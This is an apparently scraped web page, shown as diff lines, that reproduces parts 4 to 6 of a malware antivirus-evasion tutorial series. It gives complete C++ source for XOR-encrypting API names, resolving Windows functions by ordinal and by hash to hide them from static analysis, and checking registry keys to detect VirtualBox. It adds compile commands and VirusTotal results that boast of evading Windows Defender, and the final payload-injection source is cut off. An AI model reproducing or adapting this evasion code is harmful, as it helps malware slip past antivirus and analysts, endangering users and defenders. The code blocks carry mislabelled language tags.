+img_file_header = (PIMAGE_FILE_HEADER)(sig + 1);
+// get the "optional" header
+// (it's not actually optional for executables).
+img_opt_header = (PIMAGE_OPTIONAL_HEADER)(img_file_header + 1);
+// finally, get the export directory table.
+if (IMAGE_DIRECTORY_ENTRY_EXPORT
+&gt;= img_opt_header-&gt;
+NumberOfRvaAndSizes) {
+
+// this image doesn't have an
+// export directory table.
+return NULL;
+}
+rva = img_opt_header-&gt;
+DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
+VirtualAddress;
+edt = (PIMAGE_EXPORT_DIRECTORY)(base + rva);
+return edt;
+}
+And searches a module’s name pointer table (NPT) for the named procedure:
+// binary search
+DWORD findFuncB(PDWORD npt, DWORD size, PBYTE base, LPCSTR proc) {
+INT
+cmp;
+DWORD max;
+DWORD mid;
+DWORD min;
+min = 0;
+max = size - 1;
+while (min &lt;= max) {
+mid = (min + max) &gt;&gt; 1;
+cmp = strcmp((LPCSTR)(npt[mid] + base), proc);
+if (cmp &lt; 0) {
+min = mid + 1;
+} else if (cmp &gt; 0) {
+max = mid - 1;
+} else {
+return mid;
+}
+}
+return -1;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, is simply a convenience function that does the binary search of the NPT. Finally, get ordinal:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>x64 Assembly</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-nasm">// get func ordinal
+DWORD getFuncOrd(HMODULE module, LPCSTR proc) {
+PBYTE base; // module base address
+PIMAGE_EXPORT_DIRECTORY edt; // export directory table
+PWORD eot; // export ordinal table (EOT)
+
+DWORD i; // index into NPT and/or EOT
+PDWORD npt; // name pointer table (NPT)
+base = (PBYTE)module;
+// get the export directory table,
+// from which we can find the name pointer
+// table and export ordinal table.
+edt = getEDT(module);
+// get the name pointer table and
+// search it for the named procedure.
+npt = (DWORD*)(base + edt-&gt;AddressOfNames);
+i = findFuncB(npt, edt-&gt;NumberOfNames, base, proc);
+if (-1 == i) {
+// the procedure was not found
+// in the module's name pointer table.
+return -1;
+}
+// get the export ordinal table.
+eot = (WORD*)(base + edt-&gt;AddressOfNameOrdinals);
+// actual ordinal is ordinal
+// from EOT plus "ordinal base" from EDT.
+return eot[i] + edt-&gt;Base;
+}
+And main function idea without error checking:
+int main(int argc, char* argv[]) {
+XOR((char *) s_dll, sizeof(s_dll), s_key, sizeof(s_key));
+XOR((char *) s_mb, sizeof(s_mb), s_key, sizeof(s_key));
+LoadLibrary((LPCSTR) s_dll)
+HMODULE module = GetModuleHandle((LPCSTR) s_dll);
+DWORD ord = getFuncOrd(module, (LPCSTR) s_mb);
+fnMessageBoxA myMessageBoxA =
+(fnMessageBoxA)GetProcAddress(
+module, MAKEINTRESOURCE(ord));
+myMessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
+return 0;
+}
+So the full source code of our example:
+/*
+* hack.cpp - Find function from DLL
+via ordinal. C++ implementation
+
+* @cocomelonc
+* https://cocomelonc.github.io/tutorial/
+2022/03/18/simple-malware-av-evasion-4.html
+*/
+#include &lt;stdio.h&gt;
+#include "windows.h"
+typedef UINT(CALLBACK* fnMessageBoxA)(
+HWND
+hWnd,
+LPCSTR lpText,
+LPCSTR lpCaption,
+UINT
+uType
+);
+// encrypted function name (MessageBoxA)
+unsigned char s_mb[] = { 0x20, 0x1c, 0x0, 0x6, 0x11, 0x2,
+0x17, 0x31, 0xa, 0x1b, 0x33 };
+// encrypted module name (user32.dll)
+unsigned char s_dll[] = { 0x18, 0xa, 0x16, 0x7, 0x43,
+0x57, 0x5c, 0x17, 0x9, 0xf };
+// key
+char s_key[] = "mysupersecretkey";
+// XOR decrypt
+void XOR(char * data, size_t data_len, char * key,
+size_t key_len) {
+int j;
+j = 0;
+for (int i = 0; i &lt; data_len; i++) {
+if (j == key_len - 1) j = 0;
+data[i] = data[i] ^ key[j];
+j++;
+}
+}
+// binary search
+DWORD findFuncB(PDWORD npt, DWORD size, PBYTE base, LPCSTR proc) {
+INT
+cmp;
+DWORD max;
+DWORD mid;
+DWORD min;
+min = 0;
+max = size - 1;
+
+while (min &lt;= max) {
+mid = (min + max) &gt;&gt; 1;
+cmp = strcmp((LPCSTR)(npt[mid] + base), proc);
+if (cmp &lt; 0) {
+min = mid + 1;
+} else if (cmp &gt; 0) {
+max = mid - 1;
+} else {
+return mid;
+}
+}
+return -1;
+}
+// get export directory table
+PIMAGE_EXPORT_DIRECTORY getEDT(HMODULE module) {
+PBYTE base; // base address of module
+PIMAGE_FILE_HEADER img_file_header; // COFF file header
+PIMAGE_EXPORT_DIRECTORY edt; // export directory table
+DWORD rva; // relative virtual address of EDT
+PIMAGE_DOS_HEADER img_dos_header; // MS-DOS stub
+PIMAGE_OPTIONAL_HEADER img_opt_header; // "optional" header
+PDWORD sig; // PE signature
+// start at the base of the module.
+// The MS-DOS stub begins there.
+base = (PBYTE)module;
+img_dos_header = (PIMAGE_DOS_HEADER)module;
+// get the PE signature and verify it.
+sig = (DWORD*)(base + img_dos_header-&gt;e_lfanew);
+if (IMAGE_NT_SIGNATURE != *sig) {
+// bad signature -- invalid image or module handle
+return NULL;
+}
+// get the COFF file header.
+img_file_header = (PIMAGE_FILE_HEADER)(sig + 1);
+// get the "optional" header
+// (it's not actually optional for executables).
+img_opt_header = (PIMAGE_OPTIONAL_HEADER)
+(img_file_header + 1);
+
+// Finally, get the export directory table.
+if (IMAGE_DIRECTORY_ENTRY_EXPORT
+&gt;= img_opt_header-&gt;
+NumberOfRvaAndSizes) {
+// this image doesn't have an
+// export directory table.
+return NULL;
+}
+rva = img_opt_header-&gt;
+DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
+VirtualAddress;
+edt = (PIMAGE_EXPORT_DIRECTORY)(base + rva);
+return edt;
+}
+// get func ordinal
+DWORD getFuncOrd(HMODULE module, LPCSTR proc) {
+PBYTE base; // module base address
+PIMAGE_EXPORT_DIRECTORY edt; // export directory table
+PWORD eot; // export ordinal table (EOT)
+DWORD i; // index into NPT and/or EOT
+PDWORD npt; // name pointer table (NPT)
+base = (PBYTE)module;
+// get the export directory table,
+// from which we can find the name pointer
+// table and export ordinal table.
+edt = getEDT(module);
+// get the name pointer table and
+// search it for the named procedure.
+npt = (DWORD*)(base + edt-&gt;AddressOfNames);
+i = findFuncB(npt, edt-&gt;NumberOfNames, base, proc);
+if (-1 == i) {
+// the procedure was not found in
+// the module's name pointer table.
+return -1;
+}
+// get the export ordinal table.
+eot = (WORD*)(base + edt-&gt;AddressOfNameOrdinals);
+// actual ordinal is ordinal
+// from EOT plus "ordinal base" from EDT.
+
+return eot[i] + edt-&gt;Base;
+}
+int main(int argc, char* argv[]) {
+XOR((char *) s_dll, sizeof(s_dll), s_key, sizeof(s_key));
+XOR((char *) s_mb, sizeof(s_mb), s_key, sizeof(s_key));
+if (NULL == LoadLibrary((LPCSTR) s_dll)) {
+printf("failed to load library :( %s\n", s_dll);
+return -2;
+}
+HMODULE module = GetModuleHandle((LPCSTR) s_dll);
+if (NULL == module) {
+printf("failed to get a handle to %s\n", s_dll);
+return -2;
+}
+DWORD ord = getFuncOrd(module, (LPCSTR) s_mb);
+if (-1 == ord) {
+printf("failed to find ordinal %s\n", s_mb);
+return -2;
+}
+fnMessageBoxA myMessageBoxA =
+(fnMessageBoxA)GetProcAddress(
+module, MAKEINTRESOURCE(ord));
+myMessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
+return 0;
+}
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile our example: i686-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings \ -Wint-to-pointer-cast -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And run: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is work perfectly, for purity of the experiment I add one line to my hack.cpp in main function:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">//..
+DWORD ord = getFuncOrd(module, (LPCSTR) s_mb);
+if (-1 == ord) {
+printf("failed to find ordinal %s\n", s_mb);
+return -2;
+}
+printf("MessageBoxA ordinal is %d\n", ord);
+//..
+Compile and run:
+
+As you can see, our malware successfully find correct ordinal. Perfect :)
+String search result:
+strings -n 8 hack.exe | grep MessageBox
+
+As you can see no MessageBox in strings check. So this is how you hide your windows
+API calls from static analysis.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to upload to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/f75d7f5f33fc5c5e03ca22bbeda0454cd9b6aab300 9fdd109433bc6208f3d301/detection So 6 of 68 AV engines detect our file as malicious I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. pe file format pefile - python module</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">XOR source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">58. AV engines evasion techniques - part 5. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section is a result of self-researching another AV evasion trick. An example how to bypass AV engines in simple C++ malware. hashing function names This is a simple but efficient technique for hiding WinAPI calls. It is calling functions by hash names and it’s simple and often used in the “wild”. Let’s look all at an example and you’ll understand that it’s not so hard. standard calling Let’s look at an example:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+int main() {
+MessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
+return 0;
+}
+Compile:
+i686-w64-mingw32-g++ meow.cpp -o meow.exe -mconsole \
+-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
+-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
+-fno-exceptions -fmerge-all-constants \
+-static-libstdc++ -static-libgcc -fpermissive
+
+and run:
+
+As expected, it’s just a pop-up window.
+Then run strings:
+strings -n 8 meow.exe | grep MessageBox</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, the WinAPI function are explicitly read in the basic static analysis and:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">visible in the application’s import table. hashing Now let’s hide the WinAPI function MessageBoxA we are using from malware analysts. Let’s hash it: # simple stupid hashing example</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">def myHash(data):
+hash = 0x35
+for i in range(0, len(data)):
+hash += ord(data[i]) + (hash &lt;&lt; 1)
+print (hash)
+return hash
+myHash("MessageBoxA")
+and run it:</code></pre>
+            </div>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">python3 myhash.py</code></pre>
+            </div>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">What’s the main idea? The main idea is we create code where we find WinAPI function address by it’s hashing name via enumeration exported WinAPI functions. First of all, let’s declare a hash function identical in logic to the python code:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">DWORD calcMyHash(char* data) {
+DWORD hash = 0x35;
+for (int i = 0; i &lt; strlen(data); i++) {
+hash += data[i] + (hash &lt;&lt; 1);
+}
+return hash;
+}
+Then, I declared function which find Windows API function address by comparing it’s
+hash:
+static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
+PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
+PIMAGE_NT_HEADERS img_nt_header =
+(PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header-&gt;e_lfanew);
+PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
+(LPBYTE)h + img_nt_header-&gt;
+OptionalHeader.
+DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
+VirtualAddress);
+PDWORD fAddr = (PDWORD)((LPBYTE)h +
+img_edt-&gt;AddressOfFunctions);
+PDWORD fNames = (PDWORD)((LPBYTE)h +
+img_edt-&gt;AddressOfNames);
+
+PWORD fOrd = (PWORD)((LPBYTE)h +
+img_edt-&gt;AddressOfNameOrdinals);
+for (DWORD i = 0; i &lt; img_edt-&gt;AddressOfFunctions; i++) {
+LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
+if (calcMyHash(pFuncName) == myHash) {
+printf("successfully found! %s - %d\n",
+pFuncName, myHash);
+return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
+}
+}
+return nullptr;
+}
+The logic here is really simple. first we go through the PE headers to the exported
+functions we need. In the loop, we will look at and compare the hash passed to our
+function with the hashes of the functions in the export table and, as soon as we find a
+match, exit the loop:
+//...
+for (DWORD i = 0; i &lt; img_edt-&gt;AddressOfFunctions; i++) {
+LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
+if (calcMyHash(pFuncName) == myHash) {
+printf("successfully found! %s - %d\n",
+pFuncName, myHash);
+return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
+}
+}
+//...</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then we declare prototype of our function:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">typedef UINT(CALLBACK* fnMessageBoxA)(
+HWND
+hWnd,
+LPCSTR lpText,
+LPCSTR lpCaption,
+UINT
+uType
+);
+and main():
+int main() {
+HMODULE mod = LoadLibrary("user32.dll");
+LPVOID addr = getAPIAddr(mod, 17036696);
+printf("0x%p\n", addr);
+fnMessageBoxA myMessageBoxA = (fnMessageBoxA)addr;
+myMessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
+
+return 0;
+}
+
+The full source code of our malware is:
+/*
+* hack.cpp - hashing Win32API functions. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/tutorial/
+2022/03/22/simple-malware-av-evasion-5.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+typedef UINT(CALLBACK* fnMessageBoxA)(
+HWND
+hWnd,
+LPCSTR lpText,
+LPCSTR lpCaption,
+UINT
+uType
+);
+DWORD calcMyHash(char* data) {
+DWORD hash = 0x35;
+for (int i = 0; i &lt; strlen(data); i++) {
+hash += data[i] + (hash &lt;&lt; 1);
+}
+return hash;
+}
+
+static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
+PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
+PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)(
+(LPBYTE)h + img_dos_header-&gt;e_lfanew);
+PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
+(LPBYTE)h + img_nt_header-&gt;
+OptionalHeader.
+DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
+VirtualAddress);
+PDWORD fAddr = (PDWORD)((LPBYTE)h +
+img_edt-&gt;AddressOfFunctions);
+PDWORD fNames = (PDWORD)((LPBYTE)h +
+img_edt-&gt;AddressOfNames);
+PWORD fOrd = (PWORD)((LPBYTE)h +
+img_edt-&gt;AddressOfNameOrdinals);
+for (DWORD i = 0; i &lt; img_edt-&gt;AddressOfFunctions; i++) {
+LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
+if (calcMyHash(pFuncName) == myHash) {
+printf("successfully found! %s - %d\n",
+pFuncName, myHash);
+return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
+}
+}
+return nullptr;
+}
+int main() {
+HMODULE mod = LoadLibrary("user32.dll");
+LPVOID addr = getAPIAddr(mod, 17036696);
+printf("0x%p\n", addr);
+fnMessageBoxA myMessageBoxA = (fnMessageBoxA)addr;
+myMessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
+return 0;
+}
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile our malware hack.cpp: i686-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -Wint-to-pointer-cast \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and run: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, our logic is worked!!! Perfect :) What about strings? strings -n 8 hack.exe | grep MessageBox</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And let’s go to see Import Address Table:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If we delve into the investigate of the malware, we, of course, will find our hashes, strings like user32.dll, and so on. But this is just a case study. Let’s go to upload to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/d33210e3d7f9629d3465b2a0cec0c490d2254fa1 b9a2fd047457bd9046bc0eee/detection So 4 of 65 AV engines detect our file as malicious Notice that we evasion Windows Defender :) But what about WinAPI functions in classic DLL injection? I will self-research and write in a next post. In real malware, hashes are additionally protected by mathematical functions and additionally encrypted. For example Carbanak uses several AV engines evasion techniques, one of them is WinAPI call hashing. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. pe file format Carbanak source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">59. AV/VM engines evasion techniques - part 6. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section is a result of self-researching another VM evasion trick. An example how to bypass Oracle VirtualBox in simple C++ malware via Windows Registry. registry keys Registry keys and it’s values may be queries via WinAPI calls. In this post I consider how to detect VM environment via kernel32.dll functions like RegOpenKeyExA and RegQueryValueExA. The function RegOpenKeyExA has the following syntax: LSTATUS RegOpenKeyExA( [in] HKEY hKey, [in, optional] LPCSTR lpSubKey, [in]</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">DWORD ulOptions,
+[in]
+REGSAM samDesired,
+[out]
+PHKEY phkResult
+);
+which opens the specified registry key.
+Another function RegQueryValueExA retrieves the type and data for the specified value
+name associated with an open registry key:
+LSTATUS RegQueryValueExA(
+[in]
+HKEY
+hKey,
+[in, optional]
+LPCSTR lpValueName,
+LPDWORD lpReserved,
+[out, optional]
+LPDWORD lpType,
+
+[out, optional]
+LPBYTE lpData,
+[in, out, optional] LPDWORD lpcbData
+);
+1. check if specified registry paths exist</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For checking this I can use the following logic: int reg_key_ex(HKEY hKeyRoot, char* lpSubKey) { HKEY hKey = nullptr; LONG ret = RegOpenKeyExA(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">if (ret == ERROR_SUCCESS) {
+RegCloseKey(hKey);
+return TRUE;
+}
+return FALSE;
+}
+So as you can see I just check if registry key path exists. Return TRUE if exists, return
+FALSE otherwise.
+2. check if specified registry key contain value</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For example something like this logic: int reg_key_compare(HKEY hKeyRoot, char* lpSubKey, char* regVal, char* compare) { HKEY hKey = nullptr; LONG ret; char value[1024];</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">DWORD size = sizeof(value);
+ret = RegOpenKeyExA(hKeyRoot, lpSubKey, 0, KEY_READ,
+&amp;hKey);
+if (ret == ERROR_SUCCESS) {
+RegQueryValueExA(hKey, regVal, NULL, NULL,
+(LPBYTE)value, &amp;size);
+if (ret == ERROR_SUCCESS) {
+if (strcmp(value, compare) == 0) {
+return TRUE;
+}
+}
+}
+return FALSE;
+}
+This function logic is also quite simple. We check value of the registry key via
+RegQueryValueExA in which the result of function RegOpenKeyExA is the first
+
+parameter.
+I will only consider Oracle VirtualBox. For another VMs/sandboxes the tricks is
+the same.
+practical example</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So let’s go to consider practical example. Let’s take a look at the complete source code:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+* hack.cpp
+* classic payload injection with
+VM virtualbox evasion tricks
+* author: @cocomelonc
+* https://cocomelonc.github.io/tutorial/
+2022/04/09/malware-av-evasion-6.html
+*/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
